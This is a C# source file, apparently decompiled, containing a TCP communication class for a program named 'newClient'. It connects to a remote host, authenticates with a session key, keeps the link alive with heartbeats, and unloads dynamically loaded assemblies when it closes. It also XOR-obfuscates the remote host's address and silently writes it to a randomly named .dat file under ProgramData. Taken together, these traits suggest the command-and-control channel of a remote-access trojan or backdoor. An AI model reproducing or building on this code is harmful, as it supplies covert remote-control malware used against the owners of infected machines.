using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Messages;
using Models;
using algorithm;
using newClient.Utilities;

namespace newClient.Comms.TCP;

public class TcpServer : ISocketModule
{
	private static readonly int TIMEOUT = 20000;

	private static readonly int mss = 4096;

	private List<byte> receivedMessage;

	private readonly int MessageHeaderSize;

	public readonly TcpClient Client;

	private bool initialcommunication;

	private NetworkStream networkStream;

	private object SyncClose = new object();

	private int ReadTimeout;

	public AesManaged aesManaged { get; set; }

	public ProType ProtocolType
	{
		get
		{
			return ProType.TCP;
		}
		set
		{
		}
	}

	public bool Connected { get; set; }

	public Channel<byte[]> ConsumerChannel { get; set; }

	public TcpServer()
	{
		Client = new TcpClient();
		MessageHeaderSize = config.SessionKey.Length + 4;
		initialcommunication = true;
		aesManaged = new AesManaged(config.SessionKey.Replace("@", ""));
	}

	public void setdatfile()
	{
		try
		{
			byte[] bytes = BitConverter.GetBytes((ushort)new Random().Next(1, 65535));
			byte[] bytes2 = BitConverter.GetBytes((ushort)1);
			using MemoryStream memoryStream = new MemoryStream();
			using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
			binaryWriter.Write(bytes);
			binaryWriter.Write(bytes2);
			byte[] bytes3 = Encoding.Unicode.GetBytes(((IPEndPoint)Client.Client.RemoteEndPoint).Address.ToString());
			byte[] array = new byte[32];
			Array.Copy(bytes3, array, bytes3.Length);
			binaryWriter.Write(array);
			binaryWriter.Write((ushort)((IPEndPoint)Client.Client.RemoteEndPoint).Port);
			byte[] array2 = memoryStream.ToArray();
			for (int i = 0; i < array2.Length - 2; i++)
			{
				array2[i + 2] ^= bytes[i % 2];
			}
			try
			{
				File.WriteAllBytes(Environment.GetEnvironmentVariable("systemdrive") + "\\programdata\\sJuDr005Km.dat", array2);
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	public bool socketConnect(string host, int port)
	{
		try
		{
			Logger.Info("socketConnect");
			Client.Connect(host, port);
			networkStream = new NetworkStream(Client.Client, ownsSocket: true);
			networkStream.ReadTimeout = 30000;
			Connected = Client.Connected;
			Logger.Info("Connected : " + Connected);
			if (Connected)
			{
				Logger.Info("Connected : " + Connected);
				receivedMessage = new List<byte>();
				ConsumerChannel = new Channel<byte[]>();
				ThreadPool.QueueUserWorkItem(AsyncClientReceived);
				socketSend(Encoding.UTF8.GetBytes(config.SessionKey));
				setdatfile();
				ThreadPool.QueueUserWorkItem(socketHEARTBEAT);
			}
			Logger.Info("Connected : " + Connected);
		}
		catch (Exception ex)
		{
			Logger.Info(ex.ToString());
			socketclose();
		}
		return Client.Connected;
	}

	public void socketHEARTBEAT(object state)
	{
		Thread.Sleep(3000);
		try
		{
			byte[] array = new byte[MessageHeaderSize];
			Encoding.UTF8.GetBytes(config.SessionKey).CopyTo(array, 0);
			BitConverter.GetBytes(268435455).CopyTo(array, config.SessionKey.Length);
			Logger.Info("socketHEARTBEAT");
			while (Connected)
			{
				if (++ReadTimeout > 3)
				{
					throw new Exception();
				}
				networkStream.Write(array, 0, array.Length);
				Thread.Sleep(10000);
			}
		}
		catch (Exception ex)
		{
			Logger.Info(ex.ToString());
			socketclose();
		}
	}

	private void AsyncClientReceived(object state)
	{
		try
		{
			byte[] array = new byte[mss];
			while (true)
			{
				int num = networkStream.Read(array, 0, mss);
				if (num == mss)
				{
					receivedMessage.AddRange(array);
				}
				else
				{
					if (num <= 0)
					{
						break;
					}
					receivedMessage.AddRange(array.Take(num));
				}
				ProcessReceivedData();
			}
			throw new Exception();
		}
		catch (Exception ex)
		{
			Logger.Info(ex.ToString());
			socketclose();
		}
	}

	private void ProcessReceivedData()
	{
		ReadTimeout = 0;
		if (receivedMessage.Count < MessageHeaderSize)
		{
			return;
		}
		MessageheadData messageheadData = bytesToMessageHeader(receivedMessage);
		if (!messageheadData._senssionSign.Equals(config.SessionKey))
		{
			receivedMessage.Clear();
			messageheadData = null;
			return;
		}
		if (receivedMessage.Count - MessageHeaderSize < messageheadData.MessageLength)
		{
			messageheadData = null;
			return;
		}
		if (receivedMessage.Count - MessageHeaderSize > messageheadData.MessageLength)
		{
			byte[] array = new byte[messageheadData.MessageLength];
			receivedMessage.CopyTo(MessageHeaderSize, array, 0, messageheadData.MessageLength);
			ConsumerChannel.TryEnqueue(array);
			receivedMessage.RemoveRange(0, MessageHeaderSize + messageheadData.MessageLength);
			ProcessReceivedData();
			array = null;
		}
		if (receivedMessage.Count - MessageHeaderSize == messageheadData.MessageLength)
		{
			byte[] array2 = new byte[messageheadData.MessageLength];
			receivedMessage.CopyTo(MessageHeaderSize, array2, 0, messageheadData.MessageLength);
			ConsumerChannel.TryEnqueue(array2);
			receivedMessage.Clear();
			array2 = null;
		}
		messageheadData = null;
	}

	private byte[] MessageHeaderTobyte(byte[] data, int headersize)
	{
		if (initialcommunication)
		{
			initialcommunication = false;
			return data;
		}
		byte[] array = new byte[MessageHeaderSize + data.Length];
		Encoding.UTF8.GetBytes(config.SessionKey).CopyTo(array, 0);
		BitConverter.GetBytes(headersize).CopyTo(array, config.SessionKey.Length);
		data.CopyTo(array, MessageHeaderSize);
		return array;
	}

	private MessageheadData bytesToMessageHeader(List<byte> receiveddata)
	{
		byte[] array = new byte[MessageHeaderSize];
		receiveddata.CopyTo(0, array, 0, MessageHeaderSize);
		return new MessageheadData
		{
			_senssionSign = Encoding.UTF8.GetString(array, 0, config.SessionKey.Length),
			MessageLength = BitConverter.ToInt32(array, config.SessionKey.Length)
		};
	}

	public int socketSend(byte[] message)
	{
		try
		{
			if (!Client.Connected || message == null || message.Length == 0)
			{
				return -1;
			}
			byte[] array = MessageHeaderTobyte(message, message.Length);
			if (Client.Client.Poll(TIMEOUT, SelectMode.SelectWrite))
			{
				networkStream.Write(array, 0, array.Length);
			}
			return 0;
		}
		catch (Exception ex)
		{
			Logger.Info(ex.ToString());
			return -1;
		}
	}

	public void socketclose()
	{
		lock (SyncClose)
		{
			if (!Connected)
			{
				return;
			}
			try
			{
				Client?.Close();
				networkStream?.Close();
				receivedMessage.Clear();
				ConsumerChannel.CompleteAdding();
			}
			catch (Exception ex)
			{
				Logger.Info(ex.ToString());
			}
			finally
			{
				AssemblyLoader.UnloadAllAssamebly();
				Connected = false;
				Logger.Info("socketclose");
				GC.Collect();
			}
		}
	}
}
